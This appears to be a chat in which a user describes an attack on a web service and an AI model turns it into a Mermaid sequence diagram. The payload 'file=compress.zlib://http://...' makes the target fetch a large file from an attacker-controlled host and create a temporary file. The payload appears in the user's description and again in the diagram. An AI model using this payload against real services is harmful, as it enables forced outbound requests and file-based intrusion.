**Acture use:**

There is a scenario where an attacker sends a payload "file=compress.zlib://http://192.168.137.98&name=1" to the attacked Web Service. The attacked Web Service will send request to 192.168.137.98 which is controlled by attacker, we can named it "attacker's web service".Then and the attackers web service will response with a large file, with can lead on attacked web service generate a temporary file.

----
Thank you for providing the scenario. Based on your description, I will create a sequence diagram using mermaid code to represent the process of an attacker sending a payload to the attacked Web Service, which in turn sends a request to the attacker's web service, resulting in a large file being sent back and a temporary file being created on the attacked Web Service.

Here is the mermaid code for the sequence diagram:

```mermaid
sequenceDiagram
    participant Attacker
    participant Attacked_WebService as Attacked Web Service
    participant Attackers_WebService as Attacker's Web Service

    Attacker->>Attacked_WebService: Send Payload
    Note over Attacker,Attacked_WebService: file=compress.zlib://http://192.168.137.98&name=1
    Attacked_WebService->>Attackers_WebService: Send Request
    Attackers_WebService->>Attacked_WebService: Respond with Large File
    Attacked_WebService->>Attacked_WebService: Generate Temporary File

```

This sequence diagram represents the following steps:

1. The attacker sends a payload with the specified content to the attacked Web Service.
2. The attacked Web Service sends a request to the attacker's web service (192.168.137.98).
3. The attacker's web service responds with a large file.
4. The attacked Web Service generates a temporary file as a result of processing the large file.

You can paste this code into a Mermaid live editor or any tool that supports Mermaid syntax to visualize the sequence diagram.
